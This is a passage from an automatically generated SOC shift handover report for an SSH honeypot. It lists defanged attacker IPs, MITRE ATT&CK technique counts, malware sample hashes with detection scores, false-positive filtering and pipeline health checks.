| `98.158.129[.]28` | **2** | 2026-05-26 10:28 | 2026-05-26 10:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.211[.]139` | 1 | 2026-05-26 14:32 | 2026-05-26 14:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.189.27[.]152` | 1 | 2026-05-26 14:46 | 2026-05-26 14:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.249.110[.]181` | 1 | 2026-05-26 08:45 | 2026-05-26 08:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.110.13[.]192` | 1 | 2026-05-26 10:32 | 2026-05-26 10:33 | 36s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.159.39[.]226` | 1 | 2026-05-26 14:35 | 2026-05-26 14:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-05-26 10:28 | 2026-05-26 10:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.29[.]10` | 1 | 2026-05-26 08:00 | 2026-05-26 08:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]84` | 1 | 2026-05-26 14:41 | 2026-05-26 14:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.63.198[.]239` | 1 | 2026-05-26 13:02 | 2026-05-26 13:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.211.56[.]214` | 1 | 2026-05-26 13:20 | 2026-05-26 13:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.139[.]99` | 1 | 2026-05-26 12:26 | 2026-05-26 12:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.190.186[.]97` | 1 | 2026-05-26 10:34 | 2026-05-26 10:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.76.147[.]226` | 1 | 2026-05-26 13:04 | 2026-05-26 13:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-05-26 14:50 | 2026-05-26 14:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.91.186[.]36` | 1 | 2026-05-26 14:55 | 2026-05-26 14:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.95.213[.]28` | 1 | 2026-05-26 15:05 | 2026-05-26 15:05 | 12s | 0 | `T1592` | 🟢 LOW |
| `186.31.95[.]163` | 1 | 2026-05-26 13:16 | 2026-05-26 13:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.33.251[.]218` | 1 | 2026-05-26 12:57 | 2026-05-26 12:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.248.8[.]33` | 1 | 2026-05-26 12:56 | 2026-05-26 12:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.26.252[.]153` | 1 | 2026-05-26 14:04 | 2026-05-26 14:04 | 4s | 0 | `T1592` | 🟢 LOW |
| `32.192.202[.]58` | 1 | 2026-05-26 12:55 | 2026-05-26 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-26 08:02 | 2026-05-26 08:03 | 83s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | 1 | 2026-05-26 10:36 | 2026-05-26 10:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]49` | 1 | 2026-05-26 14:52 | 2026-05-26 14:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]58` | 1 | 2026-05-26 14:48 | 2026-05-26 14:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-05-26 13:42 | 2026-05-26 13:42 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `94.101.54[.]97` | 1 | 2026-05-26 08:49 | 2026-05-26 08:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `98.158.129[.]28` | 1 | 2026-05-26 12:39 | 2026-05-26 12:41 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.249.110[.]181` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 34 |
| `3.21.171[.]90` | US | Amazon Technologies Inc. | **100** ⚠️ | 39 |
| `118.145.238[.]60` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `116.110.13[.]192` | VN | Viettel Group | **100** ⚠️ | 1 |
| `107.189.27[.]152` | NL | RouterHosting LLC | **100** ⚠️ | 10 |
| `176.65.139[.]99` | NL | Storm Industries | **100** ⚠️ | 18 |
| `3.142.134[.]216` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `98.158.129[.]28` | CA | Colosseum Online Inc. | **100** ⚠️ | 1 |
| `223.123.43[.]5` | PK | CMPak Limited | **100** ⚠️ | 46 |
| `116.110.6[.]117` | VN | Viettel Group | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 349 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 175 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 141 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 69 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 69 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 464 cases |
| Tool 34  | Credential Extractor        | ✅ 318 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (3.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 42 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 141 priority case(s) shown individually · 51 recon entry/entries in table (23 group(s) consolidating 279 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-26T15:43:15Z_
